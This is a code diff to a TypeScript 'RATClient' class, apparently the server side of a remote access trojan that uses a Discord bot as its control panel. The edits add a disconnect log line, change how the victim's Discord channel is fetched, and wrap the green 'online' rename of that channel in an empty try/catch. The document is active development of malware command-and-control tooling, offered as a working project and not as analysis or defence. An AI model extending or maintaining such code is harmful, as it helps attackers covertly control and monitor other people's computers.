@@ -56,6 +56,7 @@ export default class RATClient implements IRATClient {
     }
 
     disconnect(): void {
+        console.log(`[RAT SERVER] Client disconnected with UUID ${this.uuid}`);
         this.socket.destroy();
     }
 
@@ -118,14 +119,16 @@ export default class RATClient implements IRATClient {
         
         // change the channel name to green
         //@ts-ignore
-        let channel = this.ratServer.client.channels.cache.get(user.channelId) as TextChannel;
+        // let channel = this.ratServer.client.channels.cache.get(user.channelId) as TextChannel;
+        let channel = await this.ratServer.client.channels.fetch(user.channelId) as TextChannel;
         if (!channel) {
             //@ts-ignore
-            channel = await this.ratServer.client.channels.fetch(user.channelId) as TextChannel;
             if (!channel) {
                 return;
             }               
         }
-        await channel.setName(`🟢${channel.name.substring(2, channel.name.length)}`);
+        try {
+            await channel.setName(`🟢${channel.name.substring(2, channel.name.length)}`);
+        } catch(error) {}
     }
 }
